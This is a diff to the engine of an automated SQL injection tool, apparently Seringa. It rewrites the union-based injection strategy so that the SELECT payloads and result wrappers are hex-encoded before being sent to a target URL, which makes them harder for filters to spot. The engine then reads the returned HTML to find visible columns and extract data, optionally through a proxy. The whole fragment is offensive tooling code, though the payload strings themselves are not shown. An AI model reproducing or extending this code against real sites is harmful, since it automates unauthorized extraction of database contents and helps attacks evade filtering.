@@ -130,7 +130,8 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
             {
                 if(i > 0)
                     sbCurExploit.Append(",");
-                sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectValue,i); 
+                //sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectValue,i); 
+                sbCurExploit.Append(UrlHelpers.HexEncodeValue(string.Format(GeneralPayloads.UnionBasedSelectValue, i)));
 
                 query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, sbCurExploit.ToString());
                 pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
@@ -197,7 +198,9 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
 
             StringBuilder sbCurExploit = new StringBuilder();
 
-            sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectResultWrapper, generatedpayload);
+            //sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectResultWrapper, generatedpayload);
+            sbCurExploit.Append(UrlHelpers.HexEncodeValue(string.Format(GeneralPayloads.UnionBasedSelectResultWrapper, generatedpayload)));
+            
             if(_nrCols > 1)
                 sbCurExploit.Append(",");
 
@@ -240,8 +243,14 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
 
                 if (_visibleColumnIndexes.Contains(j))
                 {
+                    /*
                     sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectCountedResultWrapper, _visibleColumnIndexes[columnIndexCounter],
                         (PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Multiple) ? generatedPayloadWithLimit : generatedPayload);
+                    */
+                    
+                    sbCurExploit.Append(string.Format(GeneralPayloads.UnionBasedSelectCountedResultWrapper, _visibleColumnIndexes[columnIndexCounter],
+                        (PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Multiple) ? generatedPayloadWithLimit : generatedPayload));
+
                     columnIndexCounter++;
                 }
                 else
